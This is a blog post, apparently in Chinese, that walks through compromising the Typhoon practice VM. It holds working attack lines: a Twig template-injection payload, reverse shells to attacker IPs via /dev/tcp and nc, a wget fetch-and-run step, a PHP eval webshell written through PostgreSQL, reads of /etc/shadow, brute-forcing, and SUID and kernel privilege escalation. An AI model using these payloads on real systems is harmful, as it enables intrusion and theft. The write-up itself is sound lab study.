@@ -1,0 +1,1265 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next mist" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.ico?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="不如茶酒伴" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="简介 目标：root 作者：PrismaCSI 难度定位：无   渗透过程中经历了好几次换环境，IP地址有点混乱，请体谅  MongoDB未授权访问">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透实战:Typhoon靶机入侵">
+<meta property="og:url" content="https://0xp1n3.github.io/2019/04/19/Typhoon/index.html">
+<meta property="og:site_name" content="不如茶酒伴">
+<meta property="og:description" content="简介 目标：root 作者：PrismaCSI 难度定位：无   渗透过程中经历了好几次换环境，IP地址有点混乱，请体谅  MongoDB未授权访问">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/mongoadmin.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/ssh.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/mongodb.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/shell.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/dvwa.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/SSTI.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/httpserver.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/www-data.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/drupal.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/lotus.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/psql.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/passwd.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/postgresql-shell.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/redis.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/cups.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/tomcat.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/struts2.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/struts2-rs.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/s2045.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/vim-root.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/root-flag.PNG">
+<meta property="og:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/autoroot.PNG">
+<meta property="og:updated_time" content="2019-04-20T06:07:29.077Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透实战:Typhoon靶机入侵">
+<meta name="twitter:description" content="简介 目标：root 作者：PrismaCSI 难度定位：无   渗透过程中经历了好几次换环境，IP地址有点混乱，请体谅  MongoDB未授权访问">
+<meta name="twitter:image" content="https://0xp1n3.github.io/2019/04/19/Typhoon/mongoadmin.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://0xp1n3.github.io/2019/04/19/Typhoon/">
+
+
+
+
+
+  <title>渗透实战:Typhoon靶机入侵 | 不如茶酒伴</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">不如茶酒伴</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">你看，那个人好奇怪哦！是啊，好像一条狗！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://0xp1n3.github.io/2019/04/19/Typhoon/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="p1n3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="不如茶酒伴">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透实战:Typhoon靶机入侵</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-19T06:48:50-07:00">
+                四月 19,2019
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul>
+<li>目标：root</li>
+<li>作者：PrismaCSI</li>
+<li>难度定位：无</li>
+</ul>
+<blockquote>
+<p>渗透过程中经历了好几次换环境，IP地址有点混乱，请体谅</p>
+</blockquote>
+<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><a id="more"></a>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">21/tcp    open  ftp         vsftpd 3.0.2</span><br><span class="line">22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">110/tcp   open  pop3        DovMarkdown Theme Kitecot pop3d</span><br><span class="line">111/tcp   open  rpcbind     2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp   open  imap        Dovecot imapd (Ubuntu)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">631/tcp   open  ipp         CUPS 1.7</span><br><span class="line">993/tcp   open  ssl/imaps?</span><br><span class="line">995/tcp   open  ssl/pop3s?</span><br><span class="line">2049/tcp  open  nfs_acl     2-3 (RPC <span class="comment">#100227)</span></span><br><span class="line">3306/tcp  open  mysql       MySQL (unauthorized)</span><br><span class="line">5432/tcp  open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5</span><br><span class="line">6379/tcp  open  redis       Redis key-value store 4.0.11</span><br><span class="line">8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">27017/tcp open  mongodb     MongoDB 3.0.15</span><br><span class="line">33867/tcp open  nlockmgr    1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">35717/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">38819/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">49775/tcp open  mountd      1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">58730/tcp open  status      1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>
+<p>可以看到有较多服务<br>那么跑目录走起，发现有<code>mongoadmin</code><br><img src="mongoadmin.PNG" alt="mongoadmin"></p>
+<blockquote>
+<p>username : typhoon<br>password : 789456123</p>
+</blockquote>
+<p>总共有两个集合，creds和typhoon，账号密码是creds下的，提示很明显了<br>反手一个SSH</p>
+<p><img src="ssh.PNG" alt="ssh"></p>
+<p>就这么没了????<br>事实上…实际的利用链当然不是这样子</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.201.6</span><br></pre></td></tr></table></figure>
+<p>先尝试下一般的利用，在低权限时写🐎</p>
+<p><img src="mongodb.PNG" alt="mongodb"></p>
+<p>但是访问页面是500，尝试写入php的反弹shell，还是500</p>
+<p><img src="shell.PNG" alt="shell"></p>
+<p>开下外挂看看怎么回事，wtf？这个权限660，其他用户读不了，尴尬😅<br>尝试crontab计划任务弹shell和写ssh公钥均因为权限问题失败</p>
+<p>突发奇想，权限不够?，那我写root的，或许运行root登录呢<br>尝试写入篡改root用户的公钥…然而还是需要密码Orz</p>
+<h1 id="服务端SSTI"><a href="#服务端SSTI" class="headerlink" title="服务端SSTI"></a>服务端SSTI</h1><p>这个靶机是有多个GetShell方法的，我尽量尝试把它们都找出来</p>
+<p><img src="dvwa.PNG" alt="dvwa"></p>
+<p>没想到还给配了个DVWA练习平台，那么默认账号密码<code>admin</code>,<code>password</code>，对于DVWA，相信大家都很熟悉了<br>但这样就没意思了，而另一个XVWA我还是第一次玩，我决定让它变得更有意思一些，JustForFun</p>
+<p>比如说模板注入<br><img src="SSTI.PNG" alt="SSTI"></p>
+<p>对于TWIG的模板注入，使用以下payload可以达到命令执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"whoami"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hello www-data</span><br></pre></td></tr></table></figure>
+<p>那么可以直接拿到shell了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.135/6666 0&gt;&amp;1"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>但是尝试了几种方法都会报字符错误<br>换一种思路<br><img src="httpserver.PNG" alt="httpserver"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name=&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"wget http://192.168.220.135/a,py /tmp/"</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">name=&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"python /tmp/a.py"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="www-data.PNG" alt="www-data"></p>
+<h1 id="Drupalgeddon2一键GetShell"><a href="#Drupalgeddon2一键GetShell" class="headerlink" title="Drupalgeddon2一键GetShell"></a>Drupalgeddon2一键GetShell</h1><p>没错，是之前遇到过的drupalgeddon2</p>
+<p><img src="drupal.PNG" alt="drupal"></p>
+<h1 id="Lotus-RCE"><a href="#Lotus-RCE" class="headerlink" title="Lotus RCE"></a>Lotus RCE</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/http/lcms_php_exec</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.220.134</span><br><span class="line"><span class="built_in">set</span> uri /cms/</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意uri格式，我在这里被坑了o_o ….</p>
+</blockquote>
+<p><img src="lotus.PNG" alt="lotus"></p>
+<h1 id="SSH弱密码"><a href="#SSH弱密码" class="headerlink" title="SSH弱密码"></a>SSH弱密码</h1><ul>
+<li>针对OpenSSH 6.6.1用户枚举漏洞</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.201.6</span><br><span class="line"><span class="built_in">set</span> threads 20</span><br><span class="line"><span class="built_in">set</span> user_file /home/user/users.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>爆出一个admin，目前为止共的三个用户名<code>admin</code>,<code>typhoon</code>,<code>root</code>,写入<code>user.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l /home/user/user.txt -P /home/user/pass.txt ssh://192.168.201.6</span><br></pre></td></tr></table></figure>
+<ul>
+<li>admin:metallica</li>
+<li>typhoon:789456123</li>
+</ul>
+<h1 id="PostgreSQL任意文件读取与写入"><a href="#PostgreSQL任意文件读取与写入" class="headerlink" title="PostgreSQL任意文件读取与写入"></a>PostgreSQL任意文件读取与写入</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.201.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>枚举出弱密码</p>
+<blockquote>
+<p>postgres:postgres</p>
+</blockquote>
+<p><img src="psql.PNG" alt="psql"></p>
+<p>数据库是空的…</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>(t <span class="built_in">TEXT</span>);</span><br><span class="line">COPY test FROM '/etc/passwd';</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure>
+<p>通过COPY读取文件</p>
+<p><img src="passwd.PNG" alt="passwd"></p>
+<blockquote>
+<p>postfixuser</p>
+</blockquote>
+<p>写入webshell</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>(t <span class="built_in">TEXT</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">test</span>(t) <span class="keyword">VALUES</span> (<span class="string">'&lt;?php @eval($_GET[cmd]);?&gt;'</span>);</span><br><span class="line">COPY test(t) TO '/var/www/html/cmd.php';</span><br></pre></td></tr></table></figure>
+<p>然而连不上，返回空数据，尝试反弹，有引号报错…语法不熟悉，毕竟是即使学的…<br>拿出navicat写，( •̀ ω •́ )y</p>
+<p><img src="postgresql-shell.PNG" alt="postgresql-shell"></p>
+<p>其实这里还可以利用UDF提权，不过对应版本的<code>.so</code>我没有找到…自己搭建的话比较麻烦，就先放下了</p>
+<h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><p><img src="redis.PNG" alt="redis"></p>
+<p>与MongoDb一样的利用链，一样的坑</p>
+<h1 id="CUPS远程打印服务GetShell-amp-提权"><a href="#CUPS远程打印服务GetShell-amp-提权" class="headerlink" title="CUPS远程打印服务GetShell&amp;提权"></a>CUPS远程打印服务GetShell&amp;提权</h1><p>作者设计预期应该是有631的cups这一操作<br>但我死活复现不出来…..tcl</p>
+<blockquote>
+<p><a href="https://www.exploit-db.com/exploits/37336" target="_blank" rel="noopener">CVE-2015-1158</a></p>
+</blockquote>
+<p><img src="cups.PNG" alt="cups"></p>
+<h1 id="Tomcat后台文件上传"><a href="#Tomcat后台文件上传" class="headerlink" title="Tomcat后台文件上传"></a>Tomcat后台文件上传</h1><p>tomcat默认密码</p>
+<p><img src="tomcat.PNG" alt=""></p>
+<p>将jsp反弹马(<code>reverse.jsp</code>)打包成zip，改后缀为war，上传<br>访问<code>http://192.168.201.6:8080/reverse/reverse.jsp</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tomcat7@typhoon:/var/lib/tomcat7$ whoami</span><br><span class="line">whoami</span><br><span class="line">tomcat7</span><br></pre></td></tr></table></figure>
+<p>成功拿到tomcat7权限的shell<br>也可以使用msf的<code>exploit/mutli/http/tomcat/tomcat_mgr_upload</code></p>
+<h1 id="Struts2多处漏洞"><a href="#Struts2多处漏洞" class="headerlink" title="Struts2多处漏洞"></a>Struts2多处漏洞</h1><p><img src="struts2.PNG" alt=""><br>可以看到有两个struts2-showcase，拿出的struts-scan扫一波，刚好体验一下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python struts-scan.py http://192.168.201.6:8080/struts2-showcase/showcase.action</span><br></pre></td></tr></table></figure>
+<p><img src="struts2-rs.PNG" alt=""></p>
+<p>然而利用有问题…要是有时间的话，算了，不立flag了<br>翻箱倒柜找到多个exp，体验都极差…..最后有一发还行，哎，还是得自己上手才能丰衣足食，事后再搞一波吧</p>
+<p><img src="s2045.PNG" alt=""></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="提权方法一：SUID提权"><a href="#提权方法一：SUID提权" class="headerlink" title="提权方法一：SUID提权"></a>提权方法一：SUID提权</h2><p>经典的SUID提权<br>枚举S权限程序:<code>find / -perm -4000 2&gt;/dev/null</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 三个可疑程序</span></span><br><span class="line">/usr/bin/head</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/vim.basic</span><br></pre></td></tr></table></figure>
+<p><strong>head</strong></p>
+<p>直接<code>head /etc/shadow</code>成功拿到所有账户密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:<span class="variable">$6</span><span class="variable">$xlUx2G5p</span>$.6IGWvV41rccKNfq7BeLhDFB6YZtsbpHGppKPZ0Cp9/1w1a/xx/UtyPy02f1gdv4tw4ibqOyzVcmwutrOiWlq1:17826:0:99999:7:::</span><br></pre></td></tr></table></figure>
+<p><strong>vim</strong></p>
+<p>这个vim有点奇怪，直接<code>!/bin/bash</code>或<code>vim -c &#39;:!/bin/sh&#39;</code>得到得依然是原权限得shell…<br>但通过vim得shell再使用py的os库执行可以得到root</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim -c <span class="string">':python import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'</span></span><br></pre></td></tr></table></figure>
+<p><img src="vim-root.PNG" alt="vim-root.PNG"></p>
+<p><strong>at</strong></p>
+<p>这个at命令跟vim一样的坑</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">at -t <span class="variable">$now</span> `/bin/bash -i &gt;&amp; /dev/tcp/192.168.201.7/6666 0&gt;&amp;1`</span><br></pre></td></tr></table></figure>
+<p>得到的是原shell，但这次py也救不了了…利用失败</p>
+<h2 id="提权方法二：Crontab提权"><a href="#提权方法二：Crontab提权" class="headerlink" title="提权方法二：Crontab提权"></a>提权方法二：Crontab提权</h2><p>利用特权的head读取crontab任务</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">head /var/spool/cron/crontabs/root -n 50</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">*/1 * * * * /tab/script.sh</span><br></pre></td></tr></table></figure>
+<p>到tab下看一下，权限是777</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tab$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 86 Apr 19 20:16 script.sh</span><br><span class="line">typhoon@typhoon:/tab$ cat script.sh </span><br><span class="line">echo &quot;Typhoon is UP!&quot;</span><br><span class="line"></span><br><span class="line">#&lt;typh00n!&gt; P0st_3xpl01t3R_flaqGq &lt;typhoon!&gt;</span><br></pre></td></tr></table></figure>
+<p>写入反弹shell命令到<code>script.sh</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tab$ echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1&quot; &gt; script.sh</span><br></pre></td></tr></table></figure>
+<p>未知原因反弹没生效，而nc是没有<code>-e</code>参数的那种</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tab$ <span class="built_in">echo</span> <span class="string">"mkfifo /tmp/test;cat /tmp/test|/bin/sh -i 2&gt;&amp;1|nc 192.168.200.5 6666 &gt;/tmp/test"</span> &gt; script.sh</span><br></pre></td></tr></table></figure>
+<p><img src="root-flag.PNG" alt="root-flag"></p>
+<h2 id="提权方法三：内核提权"><a href="#提权方法三：内核提权" class="headerlink" title="提权方法三：内核提权"></a>提权方法三：内核提权</h2><p>内核提取最方便、快捷，但是有局限性,<a href="https://www.exploit-db.com/exploits/37292" target="_blank" rel="noopener">exp</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$python</span> -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">typhoon@typhoon:/tmp$ wget 192.168.200.6:8000/37292.c</span><br><span class="line">typhoon@typhoon:/tmp$ gcc 37292.c -o hac</span><br><span class="line">typhoon@typhoon:/tmp$ chmod +x hack</span><br><span class="line">typhoon@typhoon:/tmp$ ./hack</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<p>最后来试一下内核自动化提权脚本</p>
+<p><img src="autoroot.PNG" alt="autoroot"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束,感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+    
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/26/reverse-shell/" rel="next" title="Linux&Win花式弹shell指南">
+                <i class="fa fa-chevron-left"></i> Linux&Win花式弹shell指南
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="p1n3">
+            
+              <p class="site-author-name" itemprop="name">p1n3</p>
+              <p class="site-description motion-element" itemprop="description">何人的归宿是星辰大海?</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/0xp1n3" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
